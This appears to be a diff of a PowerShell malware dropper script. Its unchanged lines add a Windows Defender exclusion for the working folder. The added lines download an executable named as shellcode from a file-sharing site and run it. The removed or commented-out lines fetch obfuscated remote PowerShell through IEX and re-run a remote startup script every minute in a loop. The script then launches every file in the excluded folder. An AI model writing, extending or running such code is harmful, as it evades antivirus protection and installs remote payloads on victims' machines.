@@ -29,18 +29,15 @@ New-Item -ItemType Directory -Path $temp
 
 Add-MpPreference -ExclusionPath $dir
 
-$shellcode = ("https://raw.githubusercontent.com/43a1723/test/main/Extras/shellcode.ps1")
-$download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
-Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru
+# $shellcode = ("https://raw.githubusercontent.com/43a1723/test/main/Extras/shellcode.ps1")
+# $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
+# Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru
 
+Invoke-WebRequest -Uri "https://anonsharing.com/file/8b24841448995265/shellcode_(3).exe" -OutFile "$temp\s.exe"
+Start-Process -FilePath "$temp\s.exe"
 
 Get-ChildItem -Path $dir | Where-Object { $_.PSIsContainer -eq $false } | ForEach-Object {
     Write-Output $_.FullName
     Start-Process -FilePath $_.FullName
 }
 
-$scriptContent = Invoke-WebRequest -uri "https://raw.githubusercontent.com/43a1723/test/main/startup.ps1" -UseBasicParsing
-while ($true) {
-    Invoke-Expression $scriptContent.Content
-    Start-Sleep -Seconds 60
-}
